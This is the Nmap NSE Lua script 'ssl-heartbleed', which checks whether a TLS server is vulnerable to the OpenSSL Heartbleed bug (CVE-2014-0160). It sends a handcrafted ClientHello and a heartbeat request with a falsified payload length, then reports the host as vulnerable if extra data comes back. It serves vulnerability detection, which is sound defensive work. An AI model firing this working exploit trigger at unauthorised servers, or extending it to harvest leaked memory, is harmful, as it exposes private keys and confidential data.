description = [[
Detects whether a server is vulnerable to the OpenSSL Heartbleed bug (CVE-2014-0160).
The code is based on the Python script ssltest.py authored by Jared Stafford (jspenguin@jspenguin.org)
]]

---
-- @usage
-- nmap -p 443 --script ssl-heartbleed <target>
--
-- @output
-- PORT    STATE SERVICE
-- 443/tcp open  https
-- | ssl-heartbleed:
-- |   VULNERABLE:
-- |   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
-- |     State: VULNERABLE
-- |     Risk factor: High
-- |     Description:
-- |       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
-- |
-- |     References:
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
-- |       http://www.openssl.org/news/secadv_20140407.txt
-- |_      http://cvedetails.com/cve/2014-0160/
--
--
-- @args ssl-heartbleed.protocols (default tries all) TLS 1.0, TLS 1.1, or TLS 1.2
--

local bin = require('bin')
local match = require('match')
local nmap = require('nmap')
local shortport = require('shortport')
local sslcert = require('sslcert')
local stdnse = require('stdnse')
local string = require('string')
local table = require('table')
local tls = require('tls')
local vulns = require('vulns')

author = "Patrik Karlsson <patrik@cqure.net>"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = { "vuln", "safe" }

local arg_protocols = stdnse.get_script_args(SCRIPT_NAME .. ".protocols") or {'TLSv1.0', 'TLSv1.1', 'TLSv1.2'}

portrule = function(host, port)
  return shortport.ssl(host, port) or sslcert.isPortSupported(port)
end

local function recvhdr(s)
  local status, hdr = s:receive_buf(match.numbytes(5), true)
  if not status then
    stdnse.print_debug(3, 'Unexpected EOF receiving record header - server closed connection')
    return
  end
  local pos, typ, ver, ln = bin.unpack('>CSS', hdr)
  return status, typ, ver, ln
end

local function recvmsg(s, len)
  local status, pay = s:receive_buf(match.numbytes(len), true)
  if not status then
    stdnse.print_debug(3, 'Unexpected EOF receiving record payload - server closed connection')
    return
  end
  return true, pay
end

local function testversion(host, port, version)

  local hello = bin.pack('H>SH', "16", version, table.concat(
      {
        "00 dc", -- record length
        "01", -- handshake type ClientHello
        "00 00 d8", -- body length
        "03 02", -- TLSv1.1
        "53 43 5b 90", -- date/time (Tue Apr  8 02:14:40 2014)
        "9d9b720bbc0cbc2b92a84897cfbd3904cc160a8503909f770433d4de", -- random
        "00", -- session ID
        "00 66", -- cipher suites length (102 = 51 suites)
        "c0 14", -- TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
        "c0 0a", -- TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
        "c0 22", -- TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA
        "c0 21", -- TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA
        "00 39", -- TLS_DHE_RSA_WITH_AES_256_CBC_SHA
        "00 38", -- TLS_DHE_DSS_WITH_AES_256_CBC_SHA
        "00 88", -- TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
        "00 87", -- TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA
        "c0 0f", -- TLS_ECDH_RSA_WITH_AES_256_CBC_SHA
        "c0 05", -- TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA
        "00 35", -- TLS_RSA_WITH_AES_256_CBC_SHA
        "00 84", -- TLS_RSA_WITH_CAMELLIA_256_CBC_SHA
        "c0 12", -- TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
        "c0 08", -- TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA
        "c0 1c", -- TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA
        "c0 1b", -- TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA
        "00 16", -- TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
        "00 13", -- TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA
        "c0 0d", -- TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA
        "c0 03", -- TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA
        "00 0a", -- TLS_RSA_WITH_3DES_EDE_CBC_SHA
        "c0 13", -- TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
        "c0 09", -- TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
        "c0 1f", -- TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA
        "c0 1e", -- TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA
        "00 33", -- TLS_DHE_RSA_WITH_AES_128_CBC_SHA
        "00 32", -- TLS_DHE_DSS_WITH_AES_128_CBC_SHA
        "00 9a", -- TLS_DHE_RSA_WITH_SEED_CBC_SHA
        "00 99", -- TLS_DHE_DSS_WITH_SEED_CBC_SHA
        "00 45", -- TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA
        "00 44", -- TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA
        "c0 0e", -- TLS_ECDH_RSA_WITH_AES_128_CBC_SHA
        "c0 04", -- TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA
        "00 2f", -- TLS_RSA_WITH_AES_128_CBC_SHA
        "00 96", -- TLS_RSA_WITH_SEED_CBC_SHA
        "00 41", -- TLS_RSA_WITH_CAMELLIA_128_CBC_SHA
        "c0 11", -- TLS_ECDHE_RSA_WITH_RC4_128_SHA
        "c0 07", -- TLS_ECDHE_ECDSA_WITH_RC4_128_SHA
        "c0 0c", -- TLS_ECDH_RSA_WITH_RC4_128_SHA
        "c0 02", -- TLS_ECDH_ECDSA_WITH_RC4_128_SHA
        "00 05", -- TLS_RSA_WITH_RC4_128_SHA
        "00 04", -- TLS_RSA_WITH_RC4_128_MD5
        "00 15", -- TLS_DHE_RSA_WITH_DES_CBC_SHA
        "00 12", -- TLS_DHE_DSS_WITH_DES_CBC_SHA
        "00 09", -- TLS_RSA_WITH_DES_CBC_SHA
        "00 14", -- TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
        "00 11", -- TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA
        "00 08", -- TLS_RSA_EXPORT_WITH_DES40_CBC_SHA
        "00 06", -- TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5
        "00 03", -- TLS_RSA_EXPORT_WITH_RC4_40_MD5
        "00 ff", -- TLS_EMPTY_RENEGOTIATION_INFO_SCSV (RFC 5746)
        "01", -- compressors length
        "00", -- NULL compressor
        "00 49", -- extensions length
        "00 0b", -- ec_point_formats
        "00 04", -- ec_point_formats length
        "03", -- point formats length
        "00", -- ec_point_formats uncompressed
        "01", -- ec_point_formats ansiX962_compressed_prime
        "02", -- ec_point_formats ansiX962_compressed_char2
        "00 0a", -- elliptic_curves
        "00 34", -- elliptic_curves length
        "00 32", -- elliptic curves length
        "00 0e 00 0d 00 19 00 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0f 00 10 00 11", -- elliptic_curves data (all curves)
        "00 23", -- SessionTicket TLS
        "00 00", -- SessionTicket length
        "00 0f", -- heartbeat
        "00 01", -- heartbeat length
        "01", -- heartbeat data: peer_allowed_to_send
      })
    )

  local hb = bin.pack('H>SH', '18', version, table.concat({
        "00 03", -- record length
        "01", -- HeartbeatType HeartbeatRequest
        "0f e9", -- payload length (falsified)
        -- payload length is based on 4096 - 16 bytes padding - 8 bytes packet header + 1 to overflow
      })
    )

  local s
  local specialized = sslcert.getPrepareTLSWithoutReconnect(port)
  if specialized then
    local status
    status, s = specialized(host, port)
    if not status then
      stdnse.print_debug(3, "Connection to server failed")
      return
    end
  else
    s = nmap.new_socket()
    local status = s:connect(host, port)
    if not status then
      stdnse.print_debug(3, "Connection to server failed")
      return
    end
  end

  s:set_timeout(5000)

  if not s:send(hello) then
    stdnse.print_debug(3, "Failed to send packet to server")
    return
  end

  while(true) do
    local status, typ, ver, pay, len
    status, typ, ver, len = recvhdr(s)
    if not status or ver ~= version then
      return
    end
    status, pay = recvmsg(s, len)
    if ( typ == 22 and string.byte(pay,1) == 14 ) then break end
  end

  s:send(hb)
  while(true) do
    local status, typ, ver, len = recvhdr(s)
    if not status then
      stdnse.print_debug(3, 'No heartbeat response received, server likely not vulnerable')
      break
    end
    if typ == 24 then
      local pay
      status, pay = recvmsg(s, len)
      s:close()
      if #pay > 3 then
        return true
      else
        stdnse.print_debug(3, 'Server processed malformed heartbeat, but did not return any extra data.')
        break
      end
    elseif typ == 21 then
      stdnse.print_debug(3, 'Server returned error, likely not vulnerable')
      break
    end
  end

end

action = function(host, port)
  local vuln_table = {
    title = "The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.",
    state = vulns.STATE.NOT_VULN,
    risk_factor = "High",
    description = [[
OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
    ]],

    references = {
      'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160',
      'http://www.openssl.org/news/secadv_20140407.txt ',
      'http://cvedetails.com/cve/2014-0160/'
    }
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)
  local test_vers = arg_protocols

  if type(test_vers) == 'string' then
    test_vers = { test_vers }
  end

  for _, ver in ipairs(test_vers) do
    if nil == tls.PROTOCOLS[ver] then
      return "\n  Unsupported protocol version: " .. ver
    end
    local status = testversion(host, port, tls.PROTOCOLS[ver])
    if ( status ) then
      vuln_table.state = vulns.STATE.VULN
      break
    end
  end

  return report:make_output(vuln_table)
end
